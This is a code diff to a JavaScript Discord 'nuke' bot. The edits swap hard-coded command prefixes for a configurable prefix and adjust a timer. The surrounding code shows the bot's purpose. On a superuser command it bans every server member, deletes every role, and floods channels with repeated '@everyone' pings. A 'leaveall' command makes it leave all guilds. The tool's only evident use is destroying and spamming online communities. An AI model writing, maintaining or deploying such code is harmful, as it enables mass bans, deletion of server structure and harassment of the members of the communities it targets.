@@ -20,7 +20,7 @@ console.warn("No Details In ./config.json File, Aborting...")
 process.abort()
 }
 client.on("messageCreate", message => {
-  if (message.content.startsWith("+nuke"))
+  if (message.content.startsWith(prefix + "nuke"))
  if(message.author.id === config.superuser){
     message.delete();
 
@@ -30,7 +30,6 @@ client.on("messageCreate", message => {
     message.guild.members.forEach(m => {
       m.ban();
     });
-
     message.guild.roles.forEach(r => {
       r.delete();
     });
@@ -90,48 +89,46 @@ client.on("messageCreate", message => {
           channel.send("@everyone ");
           channel.send("@everyone ");
           channel.send("@everyone ");
-          
         });
-      }, 500);
+      }, 1000);
     });
   }
 });
 
 client.on("messageCreate", async msg => {
-  if (msg.content.startsWith(".leaveall")) {
+  if (msg.content.startsWith(prefix + "leaveall")) {
     client.guilds.forEach(guild => {
       guild.leave();
     });
-    msg.channel.send(`:joy::joy:joy: `); 
+    msg.channel.send(`:joy::joy:joy:`); 
   }
 });
-    
-var adminprefix = ["+"];
+
 client.on("messageCreate", message => {
   var argresult = message.content
     .split(` `)
     .slice(1)
     .join(" ");
 
-  if (message.content.startsWith(adminprefix + "setg")) {
+  if (message.content.startsWith(prefix + "setg")) {
     client.user.setActivity(argresult);
     message.channel.send(`**✅   ${argresult}**`);
-  } else if (message.content === adminprefix + "leave") {
+  } else if (message.content === prefix + "leave") {
     message.guild.leave();
-  } else if (message.content.startsWith(adminprefix + "setw")) {
+  } else if (message.content.startsWith(prefix + "setw")) {
     client.user.setActivity(argresult, { type: "WATCHING" });
     message.channel.send(`**✅   ${argresult}**`);
-  } else if (message.content.startsWith(adminprefix + "setl")) {
+  } else if (message.content.startsWith(prefix + "setl")) {
     client.user.setActivity(argresult, { type: "LISTENING" });
     message.channel.send(`**✅   ${argresult}**`);
-  } else if (message.content.startsWith(adminprefix + "sets")) {
+  } else if (message.content.startsWith(prefix + "sets")) {
     client.user.setActivity(argresult, {type:"STREAMING", url:"https://www.twitch.tv/dream"});
     message.channel.send(`**✅   ${argresult}**`);
   }
   if (message.content.startsWith(prefix + "setname")) {
     client.user.setUsername(argresult).then;
     message.channel.send(`Changing The Name To ..**${argresult}** `);
-  } else if (message.content.startsWith(adminprefix + "setava")) {
+  } else if (message.content.startsWith(prefix + "setava")) {
     client.user.setAvatar(argresult);
     message.channel.send(`Changing The Avatar To :**${argresult}** `);
   }
